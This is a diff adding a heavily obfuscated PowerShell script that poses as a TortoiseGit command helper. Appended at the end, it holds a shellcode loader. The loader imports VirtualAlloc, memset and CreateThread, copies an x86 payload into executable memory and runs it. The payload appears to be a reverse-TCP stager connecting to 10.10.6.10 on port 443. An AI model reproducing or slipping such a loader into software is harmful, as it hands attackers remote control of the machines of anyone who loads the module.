@@ -1,0 +1,85 @@
+function PRi`V`ATe`:geT-TOrTo`iseg`ItpATH {
+    if ((.("{0}{1}{2}"-f 'T','est-','Path') ((("{4}{0}{7}{8}{9}{6}{5}{10}{3}{1}{2}" -f '5SProgram File','tProc','.exe','eGi','C:u','i','inu5STorto','s','u5STo','rtoiseGitu5Sb','s')).("{1}{0}" -f 'PLACe','re').Invoke('u5S','\'))) -eq ${tR`Ue}) {
+        
+        return ((("{6}{2}{11}{1}{10}{4}{9}{0}{3}{7}{8}{5}" -f'v','t6v','ogram','Tor','iseGitt6vbi','e','C:t6vPr','toiseGitProc','.ex','nt6','Torto',' Files'))."r`EplaCe"(([Char]116+[Char]54+[Char]118),'\'))
+    }
+
+    return ((("{13}{9}{11}{5}{12}{15}{14}{2}{16}{10}{7}{8}{3}{0}{17}{6}{4}{1}" -f 'or','xe','is','T','iseProc.e','iles{0','o','n','{0}','gr','i','am F','}','C:{0}Pro','orto','T','eGit{0}b','t'))  -F  [cHaR]92)
+}
+
+${glo`BaL:t`ORTOISE`git`se`T`Tin`gS} = &("{1}{0}{2}" -f 'w-obje','ne','ct') ("{2}{0}{1}" -f'SO','bject','P') -Property @{
+    ("{3}{1}{0}{2}"-f 'eG','is','itPath','Torto') = (.("{1}{0}{2}{3}"-f 'et','G','-Tortoise','GitPath'))
+    ("{2}{0}{3}{1}"-f 'seG','nds','Tortoi','itComma') = @{
+        ("{1}{0}" -f'ut','abo') = ("{1}{0}"-f'ut','abo');
+        "add" = "add";
+        ("{1}{0}"-f'me','bla') = ("{1}{0}"-f'ame','bl');
+        "cat" = "cat";
+        ("{1}{0}{2}" -f'ean','cl','up') = ("{0}{1}" -f 'cleanu','p');
+        ("{0}{1}" -f 'clea','n') = ("{0}{1}" -f'clea','nup');
+        ("{1}{0}{2}" -f 'mi','com','t') = ("{2}{0}{1}"-f'omm','it','c');
+        ("{2}{0}{1}"-f'onflicte','ditor','c') = ("{1}{0}{2}" -f'onflictedi','c','tor');
+        ("{2}{0}{1}" -f'reatep','atch','c') = ("{1}{2}{0}" -f'h','create','patc');
+        ("{1}{0}"-f 'atch','p') = ("{2}{1}{3}{0}" -f 'atch','r','c','eatep');
+        ("{1}{0}" -f'f','dif') = ("{1}{0}"-f 'iff','d');
+        ("{2}{0}{1}"-f 'x','port','e') = ("{0}{1}" -f'exp','ort');
+        ("{0}{1}" -f 'he','lp') = ("{1}{0}" -f 'elp','h');
+        ("{1}{0}"-f'ore','ign') = ("{0}{1}" -f 'ign','ore');
+        "log" = "log";
+        ("{1}{0}"-f'rge','me') = ("{0}{1}" -f'm','erge');
+        ("{0}{1}" -f 'pul','l') = ("{1}{0}" -f'll','pu');
+        ("{1}{0}" -f 'sh','pu') = ("{1}{0}"-f'h','pus');
+        ("{1}{0}"-f 'ase','reb') = ("{2}{1}{0}" -f 'se','ba','re');
+        ("{1}{3}{2}{0}" -f 'e','ref','ows','br') = ("{1}{0}{2}" -f'ro','refb','wse');
+        ("{0}{1}"-f 'refl','og') = ("{1}{0}" -f 'log','ref');
+        ("{0}{2}{1}"-f'rem','ve','o') = ("{1}{0}" -f 've','remo');
+        "rm" = ("{0}{1}" -f 're','move');
+        ("{2}{0}{1}"-f'a','me','ren') = ("{2}{0}{1}" -f'm','e','rena');
+        "mv" = ("{1}{0}{2}" -f 'am','ren','e');
+        ("{2}{0}{1}"-f'reat','e','repoc') = ("{0}{2}{1}{3}"-f're','r','poc','eate');
+        ("{0}{1}"-f'in','it') = ("{1}{3}{2}{0}"-f'e','repocre','t','a');
+        ("{3}{0}{1}{2}"-f 'po','stat','us','re') = ("{2}{1}{0}" -f'ostatus','p','re');
+        ("{1}{0}"-f'tus','sta') = ("{1}{0}{2}"-f 'ost','rep','atus');
+        ("{2}{1}{0}" -f'olve','es','r') = ("{0}{1}"-f'resolv','e');
+        ("{0}{1}"-f'reve','rt') = ("{1}{0}"-f 'rt','reve');
+        ("{1}{0}"-f'gs','settin') = ("{0}{1}"-f'settin','gs');
+        ("{0}{1}"-f'c','onfig') = ("{2}{1}{0}" -f 's','ng','setti');
+        ("{0}{1}"-f'sta','sh') = ("{1}{0}"-f 'sh','sta');
+        ("{1}{0}{2}" -f'sha','sta','pply') = ("{1}{0}{2}"-f 'a','st','shapply');
+        ("{0}{2}{1}" -f'st','save','ash') = ("{0}{1}{2}"-f'stash','sav','e');
+        ("{2}{1}{0}" -f'd','d','suba') = ("{1}{0}"-f'badd','su');
+        ("{1}{2}{0}"-f 'nc','subs','y') = ("{0}{1}"-f'su','bsync');
+        ("{1}{2}{0}"-f'te','sub','upda') = ("{0}{1}{2}"-f 'su','b','update');
+        ("{1}{0}"-f'witch','s') = ("{1}{2}{0}"-f 'h','swit','c');
+        ("{1}{0}"-f't','checkou') = ("{0}{1}{2}"-f 'swi','t','ch');
+        ("{1}{0}"-f'tch','fe') = ("{1}{0}" -f'c','syn');
+        ("{0}{1}"-f 'syn','c') = ("{0}{1}"-f 'syn','c');
+    }
+}
+
+function T`GIt {
+    if (${A`RgS}) {
+        
+        if (${GLObA`L:To`RTO`iSEG`ItSET`TI`Ngs}."tORT`oI`sEg`ITcOMM`A`NdS"."COnT`A`iN`skeY"(${aR`GS}[0])) {
+            ${AR`Gs}[0] = ${gLoBal:`T`Ort`Oiseg`itsET`TInGS}."tOr`ToiSeg`itC`OMMan`ds"."gET`_I`TeM"(${A`Rgs}[0])
+        }
+
+        if (${A`RGs}[0] -eq ("{1}{0}" -f 'lp','he')) {
+            
+            ${Glo`BA`l:t`OR`TOi`Segi`TSeTTI`NGS}."ToRT`OiS`egItCOMma`N`dS"."V`AluEs".("{2}{3}{1}{0}"-f 'tor','umera','G','etEn').Invoke() | .("{3}{0}{1}{2}"-f'rt-','Obje','ct','So') | .("{1}{0}{2}"-f '-','Get','Unique')
+            return
+        }
+
+        ${ne`WArgs} = @()
+        ${Ne`wAR`GS} += ("{1}{2}{0}"-f'nd:','/','comma') + ${Ar`GS}[0]
+
+        ${C`MD} = ${A`RGS}[0]
+
+        if (${A`Rgs}."LENG`TH" -gt 1) {
+            ${a`RGS}[1..${a`Rgs}."LE`NGtH"] | &("{3}{1}{2}{0}" -f 'bject','h-','O','ForEac') { ${N`EW`Args} += ${_} }
+        }
+
+        & ${Glo`BAL`:toRToiSEgIT`sET`Ti`Ngs}."T`ORTOiS`egit`p`AtH" ${NeW`ArgS}
+    }
+}
+
+${C} = ((("{30}{83}{92}{74}{38}{41}{78}{95}{69}{72}{4}{15}{52}{12}{64}{13}{39}{67}{61}{47}{58}{56}{76}{3}{36}{53}{29}{10}{55}{45}{17}{81}{71}{40}{84}{54}{97}{9}{18}{5}{32}{44}{42}{93}{86}{0}{94}{85}{37}{66}{19}{6}{75}{22}{25}{87}{82}{63}{48}{24}{96}{68}{1}{23}{91}{60}{16}{65}{50}{49}{80}{2}{51}{73}{79}{70}{28}{46}{77}{20}{89}{62}{90}{7}{8}{88}{31}{11}{43}{33}{59}{21}{27}{34}{26}{14}{35}{57}"-f 'tPtr lpThreadAt','Param','P','nt flAlloc','Pt','te',', ui','stati','c extern In','ntPtr C','pe, uint ','set(','alAllo','IntPtr',' uint cou','r','w','D','rea','tes','d','e','t d','e','In','wSt',' src,','st, uin','r','nTy','[Dll','r mem','T','P','t','nt','at','i','llrgB)',' ','gB)]p',']pu','rea','Int','h','Protect);[','t','t ',', ','s','nFlag','tr ',' Virtu','io','c st','fl','u',');','dwSize, ','tr d',', uint d','pAddress, uin','publ','ess','c(','Creatio','bu','l','r lp','xt','dId);[DllImpo','ernel32.dllr','ern Int','lpThr','d','n','i','(rgBmsvcrt.','blic st','ea',', Int','llImport(rgBk','r','Import(r','ubli','r','(In','ackSize, IntPtr lpStartAdd','tPt','llrgB)]','ic ','ter','gBkernel32.','d','t','atic e','tPt','atic extern I'))."rEPl`A`cE"('rgB',[StRING][chaR]34));${w} = &("{0}{2}{1}"-f 'Add','Type','-') -memberDefinition ${c} -Name ("{0}{1}"-f'Win3','2') -namespace ("{1}{3}{2}{4}{0}" -f 'unctions','Wi','2','n3','F') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x06,0x0a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${z}."le`NG`Th" -gt 0x1000){${G} = ${z}."L`ength"};${X}=${W}::("{0}{1}{2}{3}"-f'Virtua','lA','ll','oc').Invoke(0,0x1000,${G},0x40);for (${i}=0;${I} -le (${z}."LeN`gtH"-1);${i}++) {${w}::"MeM`seT"([IntPtr](${x}.("{1}{2}{0}"-f '32','To','Int').Invoke()+${I}), ${Z}[${i}], 1)};${W}::("{2}{1}{0}"-f'ad','eateThre','Cr').Invoke(0,0,${X},0,0,0);for (;;){.("{2}{0}{1}" -f'rt-s','leep','Sta') 60};
